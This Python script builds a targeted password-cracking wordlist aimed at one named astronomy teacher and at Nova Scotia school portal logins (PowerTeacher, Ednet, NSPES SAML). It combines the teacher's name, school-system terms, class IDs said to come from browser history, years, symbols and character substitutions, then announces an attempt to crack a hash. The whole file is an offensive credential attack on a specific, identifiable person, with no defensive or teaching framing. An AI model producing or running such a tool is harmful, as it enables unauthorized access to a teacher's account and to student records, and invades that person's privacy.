#!/usr/bin/env python3

import itertools
import os
import datetime

# Words and themes discovered from browser history
keywords = [
    # Role
    "teacher", "Teacher", "prof", "Prof", "instructor", "Instructor",
    
    # Subject
    "astronomy", "Astronomy", "astro", "Astro", "space", "Space", "star", "Star", "galaxy", "Galaxy",
    
    # School system - based on browser history analysis
    "nspes", "NSPES", "ednet", "Ednet", "EDNET", "gnspes", "GNSPES", "PowerTeacher", "powerteacher",
    "sishrsb", "SISHRSB", "nova", "Nova", "NOVA", "scotia", "Scotia", "SCOTIA", "hrce", "HRCE",
    "hrsb", "HRSB", "everyone", "Everyone", "saml", "Saml", "SAML",
    
    # User context
    "jean", "Jean", "marc", "Marc", "samson", "Samson", "jeanmarc", "JeanMarc", "jean-marc", "Jean-Marc",
    "jms", "JMS", "js", "JS", "jmsamson", "JMSamson", "j-m-s", "J-M-S",
    
    # Common school-related - expanded with grade levels and more education terms
    "school", "School", "class", "Class", "grade", "Grade", "student", "Student", "education", "Education",
    "classroom", "Classroom", "homework", "Homework", "seating", "Seating", "attendance", "Attendance",
    "assignment", "Assignment", "test", "Test", "quiz", "Quiz", "exam", "Exam"
]

# Student/class identifiers - from the URLs in browser history
class_ids = [
    "630988", "630798", "003630823", "981778", "245051"  # These are from the URLs
]

# Common numbers and years
current_year = datetime.datetime.now().year
numbers = [
    "", "1", "2", "3", "12", "21", "123", "321", "2001", "2023", "2024", "2025",
    "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12",
]
numbers.extend([str(y) for y in range(current_year-10, current_year+1)])  # Last 10 years
numbers.extend(class_ids)  # Add the class IDs from the browser history

# Common special characters and separators
special_chars = ["", "!", "@", "#", "$", "%", "&", "*", "_", "-", ".", "?"]

# Output file
output_file = "/workspaces/JaiziahGreene/targeted_wordlist.txt"

with open(output_file, "w") as f:
    # Base words alone
    for word in keywords:
        f.write(f"{word}\n")
    
    # Words with numbers
    for word in keywords:
        for num in numbers:
            if num:  # Only if num is not empty
                f.write(f"{word}{num}\n")
    
    # Words with special chars
    for word in keywords:
        for char in special_chars:
            if char:  # Only if char is not empty
                f.write(f"{word}{char}\n")
    
    # Words with numbers and special chars
    for word in keywords:
        for num in numbers:
            for char in special_chars:
                if num or char:  # Only if either num or char is not empty
                    f.write(f"{word}{num}{char}\n")
    
    # Common astronomy terms
    astronomy_terms = ["planet", "moon", "sun", "solar", "lunar", "cosmic", "cosmos", "saturn", "jupiter", "mars", "venus", "mercury"]
    for term in astronomy_terms:
        f.write(f"{term}\n")
        f.write(f"{term.capitalize()}\n")
        for num in numbers:
            if num:
                f.write(f"{term}{num}\n")
                f.write(f"{term.capitalize()}{num}\n")
    
    # Common patterns specific to this case
    patterns = [
        "TeacherAstronomy", "AstronomyTeacher", "NovaTeacher", "TeacherNova",
        "StarGazer", "StarGazing", "SpaceExplorer", "CosmicTeacher",
        "jmsamson", "j.m.samson", "jm.samson", "j.msamson",
        "jmAstronomy", "jmTeacher", "jmProf", "jmSpace",
        # Authentication-related patterns (school portals typically have constraints)
        "JeanMarc2025", "JeanMarc2024", "JMSamson2025", "JMSamson2024",
        "JMS2025", "JMS2024", "Astronomy12", "Astronomy2025",
        # PowerTeacher portal specific (based on visited URLs)
        "SisHRSB", "PowerTeach", "PowerTeacher2025", "PowerTeacher2024",
        "NSTeacher", "NSAstronomy", "EdnetTeacher", "GNSPESTeacher",
        # SAML/Login related
        "EdnetLogin", "NSPESLogin", "TeacherPortal", "TeacherAccount",
        # Nova Scotia specific (from URLs)
        "NovaScotiaEd", "NSEducation", "HalifaxTeacher", "ScoTEacher",
        # Course-specific (from seating chart URL)
        "Astronomy12Teacher", "AstronomyClass", "Astro12", "ClassA-D",
        # Month-related combinations (teachers often use these)
        "JeanMay", "JeanJune", "MarcMay", "MarcJune", "SamsonMay",
        # Season-related
        "SpringTeacher", "SummerTeacher", "FallTeacher", "WinterTeacher",
        # Common character substitutions
        "J34nM4rc", "Te4cher", "4stronomy", "T34ch3r", "4str0n0my",
        "J3anMarc", "JeanM@rc", "Te@cher", "@stronomy"
    ]
    
    for pattern in patterns:
        f.write(f"{pattern}\n")
        for num in numbers:
            if num:
                f.write(f"{pattern}{num}\n")
        for char in special_chars:
            if char:
                f.write(f"{pattern}{char}\n")
                
    # Add SAML-specific patterns (based on SAML URLs found in history)
    saml_patterns = [
        "EdnetSAML", "NSSAML", "SAMLauth", "SAMLteacher", "SAMLuser",
        "SAMLnspes", "NSPESsaml", "EdnetAuth", "NSPESauth"
    ]
    
    for pattern in saml_patterns:
        f.write(f"{pattern}\n")
        for num in numbers[:10]:  # Use fewer numbers to avoid explosion
            if num:
                f.write(f"{pattern}{num}\n")
                
    # Common password formats for educational institutions
    edu_patterns = [
        f"Teacher{num}" for num in numbers[:10] if num
    ] + [
        f"Astronomy{num}" for num in numbers[:10] if num
    ] + [
        f"JMS{char}{num}" for char in ["@", "#", "$", "!"] for num in numbers[:5] if num
    ] + [
        f"Samson{num}{char}" for num in numbers[:5] for char in ["!", "@", "#"] if num
    ]
    
    for pattern in edu_patterns:
        f.write(f"{pattern}\n")

print(f"Targeted wordlist created at {output_file}")
print(f"Now attempting to crack the hash with this wordlist...")
